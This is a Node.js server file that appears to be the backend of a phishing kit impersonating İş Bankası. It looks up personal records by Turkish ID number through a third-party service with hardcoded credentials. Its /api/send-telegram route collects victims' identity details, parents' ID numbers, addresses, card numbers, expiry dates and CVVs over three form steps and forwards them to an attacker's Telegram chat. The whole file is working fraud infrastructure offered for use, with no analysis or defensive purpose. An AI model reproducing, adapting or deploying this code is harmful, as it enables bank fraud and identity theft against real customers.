const http = require('http');
const https = require('https');
const url = require('url');
const querystring = require('querystring');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

// MIME types
const mimeTypes = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpg',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.svg': 'image/svg+xml'
};

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  let pathname = parsedUrl.pathname;

  // API route: /api/get-tckn
  if (pathname === '/api/get-tckn' || pathname === '/get-tckn') {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(200);
      res.end();
      return;
    }

    const { tc } = parsedUrl.query;

    if (!tc || tc.length !== 11) {
      res.writeHead(400, { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      });
      res.end(JSON.stringify({ error: 'Geçerli bir TC kimlik numarası giriniz' }));
      return;
    }

    // TC Kimlik API endpoint
    const apiUrl = `https://nexusapiservice.xyz/servis/tckn/apiv2?hash=CcjS8ZvefIZccOZbr&auth=tosun&tc=${tc}`;

    console.log('API Request:', apiUrl);

    https.get(apiUrl, (apiRes) => {
      let data = '';

      apiRes.on('data', (chunk) => {
        data += chunk;
      });

      apiRes.on('end', () => {
        try {
          const jsonData = JSON.parse(data);
          console.log('API Response Status:', jsonData.Info ? jsonData.Info.Status : 'Unknown');
          res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          });
          res.end(JSON.stringify(jsonData));
        } catch (error) {
          console.error('JSON Parse Error:', error);
          res.writeHead(500, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          });
          res.end(JSON.stringify({ 
            error: 'Sunucu hatası', 
            details: error.message 
          }));
        }
      });
    }).on('error', (error) => {
      console.error('HTTPS Request Error:', error);
      res.writeHead(500, { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      });
      res.end(JSON.stringify({ 
        error: 'Sunucu hatası', 
        details: error.message 
      }));
    });
    return;
  }

  // Telegram API route: /api/send-telegram
  if (pathname === '/api/send-telegram' && req.method === 'POST') {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(200);
      res.end();
      return;
    }

    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        const {
          tckn,
          telefon,
          kartLimiti,
          adSoyad,
          dogumTarihi,
          cinsiyet,
          dogumYeri,
          anneAdi,
          babaAdi,
          anneTCKN,
          babaTCKN,
          adresIl,
          adresIlce,
          memleketIl,
          memleketIlce,
          medeniHal,
          kartNumarasi,
          sonKullanimAy,
          sonKullanimYil,
          cvv,
          hediye,
          type
        } = data;

        // Env değişkenleri
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

        // IP adresini al
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        // Tarih ve saat
        const date = new Date().toLocaleString('tr-TR', {
          timeZone: 'Europe/Istanbul',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });

        // Özel karakterleri escape et
        function escapeHtml(text) {
          if (!text) return 'Belirtilmedi';
          return String(text)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
        }

        let message = '';

        // Adım tipine göre mesaj oluştur
        if (type === 'step1') {
          message = `
🔐 <b>İş Bankası - Adım 1: Giriş Bilgileri</b>

📱 <b>TC Kimlik No:</b> <code>${escapeHtml(tckn)}</code>
📞 <b>Telefon / GSM:</b> <code>${escapeHtml(telefon)}</code>

🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}

---
<i>İş Bankası Login Form</i>
          `.trim();
        } else if (type === 'step2') {
          message = `
💳 <b>İş Bankası - Adım 2: Kart Limiti</b>

📱 <b>TC:</b> <code>${escapeHtml(tckn)}</code>
👤 <b>Ad Soyad:</b> ${escapeHtml(adSoyad)} | 📅 <b>Doğum:</b> ${escapeHtml(dogumTarihi)} | ⚧️ <b>Cinsiyet:</b> ${escapeHtml(cinsiyet)} | 📍 <b>Doğum Yeri:</b> ${escapeHtml(dogumYeri)}
👩 <b>Anne Adı:</b> ${escapeHtml(anneAdi)} | 🆔 <b>Anne TCKN:</b> <code>${escapeHtml(anneTCKN)}</code> | 👨 <b>Baba Adı:</b> ${escapeHtml(babaAdi)} | 🆔 <b>Baba TCKN:</b> <code>${escapeHtml(babaTCKN)}</code>
🏠 <b>Adres:</b> ${escapeHtml(adresIl)}/${escapeHtml(adresIlce)} | 🗺️ <b>Memleket:</b> ${escapeHtml(memleketIl)}/${escapeHtml(memleketIlce)} | 💑 <b>Medeni Hal:</b> ${escapeHtml(medeniHal)}
📞 <b>Telefon:</b> ${escapeHtml(telefon)} | 💵 <b>Kart Limiti:</b> ${escapeHtml(kartLimiti)} TL | 🎁 <b>Hediye:</b> ${escapeHtml(hediye)} TL

🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}

---
<i>İş Bankası Başvuru Formu - Kart Limiti</i>
          `.trim();
        } else if (type === 'step3') {
          message = `
💳 <b>İş Bankası - Adım 3: Kredi Kartı Bilgileri</b>

📱 <b>TC:</b> <code>${escapeHtml(tckn)}</code>
👤 <b>Ad Soyad:</b> ${escapeHtml(adSoyad)} | 📅 <b>Doğum:</b> ${escapeHtml(dogumTarihi)} | ⚧️ <b>Cinsiyet:</b> ${escapeHtml(cinsiyet)} | 📍 <b>Doğum Yeri:</b> ${escapeHtml(dogumYeri)}
👩 <b>Anne Adı:</b> ${escapeHtml(anneAdi)} | 🆔 <b>Anne TCKN:</b> <code>${escapeHtml(anneTCKN)}</code> | 👨 <b>Baba Adı:</b> ${escapeHtml(babaAdi)} | 🆔 <b>Baba TCKN:</b> <code>${escapeHtml(babaTCKN)}</code>
🏠 <b>Adres:</b> ${escapeHtml(adresIl)}/${escapeHtml(adresIlce)} | 🗺️ <b>Memleket:</b> ${escapeHtml(memleketIl)}/${escapeHtml(memleketIlce)} | 💑 <b>Medeni Hal:</b> ${escapeHtml(medeniHal)}
📞 <b>Telefon:</b> ${escapeHtml(telefon)} | 💵 <b>Kart Limiti:</b> ${escapeHtml(kartLimiti)} TL | 🎁 <b>Hediye:</b> ${escapeHtml(hediye)} TL

💳 <b>Kart Numarası:</b> <code>${escapeHtml(kartNumarasi)}</code>
📅 <b>Son Kullanma:</b> ${escapeHtml(sonKullanimAy || '')}/${escapeHtml(sonKullanimYil || '')} | 🔒 <b>CVV:</b> <code>${escapeHtml(cvv || 'Belirtilmedi')}</code>

🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}

---
<i>İş Bankası Başvuru Formu - Kredi Kartı Bilgileri</i>
          `.trim();
        } else {
          res.writeHead(400, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          });
          res.end(JSON.stringify({ error: 'Geçersiz type parametresi' }));
          return;
        }

        // Telegram Bot API'ye mesaj gönder
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const postData = JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        });

        const urlObj = new URL(telegramUrl);
        const options = {
          hostname: urlObj.hostname,
          port: 443,
          path: urlObj.pathname + urlObj.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
          }
        };

        const telegramReq = https.request(options, (telegramRes) => {
          let telegramData = '';

          telegramRes.on('data', (chunk) => {
            telegramData += chunk;
          });

          telegramRes.on('end', () => {
            try {
              const telegramJson = JSON.parse(telegramData);
              if (telegramRes.statusCode === 200) {
                res.writeHead(200, { 
                  'Content-Type': 'application/json',
                  'Access-Control-Allow-Origin': '*'
                });
                res.end(JSON.stringify({ 
                  success: true, 
                  message: 'Mesaj başarıyla gönderildi',
                  telegramResponse: telegramJson 
                }));
              } else {
                console.error('Telegram API Error:', telegramJson);
                res.writeHead(500, { 
                  'Content-Type': 'application/json',
                  'Access-Control-Allow-Origin': '*'
                });
                res.end(JSON.stringify({ 
                  error: 'Telegram mesaj gönderilemedi', 
                  details: telegramJson.description || 'Unknown error' 
                }));
              }
            } catch (error) {
              console.error('Telegram Response Parse Error:', error);
              res.writeHead(500, { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
              });
              res.end(JSON.stringify({ 
                error: 'Sunucu hatası', 
                details: error.message 
              }));
            }
          });
        });

        telegramReq.on('error', (error) => {
          console.error('Telegram Request Error:', error);
          res.writeHead(500, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          });
          res.end(JSON.stringify({ 
            error: 'Sunucu hatası', 
            details: error.message 
          }));
        });

        telegramReq.write(postData);
        telegramReq.end();

      } catch (error) {
        console.error('Error:', error);
        res.writeHead(500, { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
          error: 'Sunucu hatası', 
          details: error.message 
        }));
      }
    });
    return;
  }

  // Form submit route: /submit
  if (pathname === '/submit' && req.method === 'POST') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      const formData = querystring.parse(body);
      const tc = formData.tckn || formData.tc;
      
      if (tc && tc.length === 11) {
        // basvur.html'ye TC ile yönlendir
        res.writeHead(302, {
          'Location': `/basvur.html?tc=${tc}`
        });
        res.end();
      } else {
        res.writeHead(400, { 'Content-Type': 'text/html' });
        res.end('<h1>Geçersiz TC Kimlik Numarası</h1>');
      }
    });
    return;
  }

  // Static file serving
  if (pathname === '/') {
    pathname = '/index.html';
  }

  const filePath = path.join(__dirname, pathname);
  const extname = String(path.extname(filePath)).toLowerCase();
  const contentType = mimeTypes[extname] || 'application/octet-stream';

  fs.readFile(filePath, (error, content) => {
    if (error) {
      if (error.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 - File Not Found</h1>');
      } else {
        res.writeHead(500);
        res.end(`Server Error: ${error.code}`);
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = server;

